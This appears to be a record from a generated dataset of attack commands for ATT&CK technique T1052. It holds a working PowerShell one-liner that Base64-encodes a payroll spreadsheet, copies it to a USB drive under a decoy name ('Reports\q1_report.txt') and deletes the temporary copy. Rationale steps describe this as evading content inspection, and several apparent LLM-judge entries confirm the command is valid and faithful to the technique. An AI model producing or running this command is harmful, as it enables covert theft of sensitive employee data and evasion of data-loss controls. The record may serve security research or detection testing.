command: $usb=((Get-CimInstance Win32_LogicalDisk -Filter "DriveType=2" | Select -First 1 -ExpandProperty DeviceID)+'\'); $enc=Join-Path $env:TEMP 'payroll.b64'; $bytes=[IO.File]::ReadAllBytes("$env:USERPROFILE\Desktop\HR\payroll.xlsx"); [IO.File]::WriteAllText($enc,[Convert]::ToBase64String($bytes)); New-Item -ItemType Directory -Force -Path (Join-Path $usb 'Reports') | Out-Null; Copy-Item $enc (Join-Path $usb 'Reports\q1_report.txt') -Force; Remove-Item $enc -Force
explanation: Base64-encodes a sensitive spreadsheet and stores it as a text file on the removable drive under an innocuous folder, using Copy-Item. Uses only local operations.
rationale_steps: Base64-encode the target to evade simple content inspection
Create a benign-looking folder on the USB
Copy the encoded data with Copy-Item

llm_judgments.syntactic_justification: Well-formed PowerShell with balanced quotes/parentheses, proper separators, and valid cmdlets/parameters and operators.
llm_judgments.semantic_justification: It base64-encodes the target file, creates an innocuous folder on a removable (DriveType=2) drive, copies the encoded text there under a misleading name, and deletes the temp file—consistent with exfiltration over physical media.

llm_judgments.syntactic_justification: The PowerShell command is perfectly well-formed with balanced parentheses, proper string interpolation, valid semicolon separators, and correct use of .NET class methods and cmdlets throughout.
llm_judgments.semantic_justification: The command precisely implements T1052 by detecting a removable drive via WMI, reading a sensitive HR spreadsheet, Base64-encoding it to obfuscate content, renaming it with an innocuous name (q1_report.txt) under a benign-looking folder (Reports), copying it to the USB drive, and cleaning up the temp file — fully aligning with staging, obfuscation, and physical medium exfiltration behaviors described in the technique.

llm_judgments.syntactic_justification: The command uses valid PowerShell syntax, correctly handles object properties, and properly balances parentheses and quotes.
llm_judgments.semantic_justification: The command accurately identifies a removable drive, performs data obfuscation via Base64 encoding, and transfers the staged file to the physical medium while renaming it to evade detection.
